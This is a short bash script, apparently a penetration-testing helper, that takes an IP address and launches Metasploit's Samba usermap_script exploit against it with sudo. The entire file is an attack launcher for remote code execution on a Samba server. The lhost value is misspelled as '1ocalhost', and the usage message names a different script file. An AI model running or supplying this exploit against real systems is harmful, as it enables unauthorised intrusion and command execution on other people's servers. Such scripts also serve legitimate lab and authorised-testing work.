#!/bin/bash

if [ $# -eq 0 ]; then
	echo "Please specify a ip address by exporting: eg: ./smb_version_ms.sh <ipaddress>";
else
  sudo msfconsole -x "use exploit/multi/samba/usermap_script; set lhost 1ocalhost; set rhost $1; run; exit"
fi
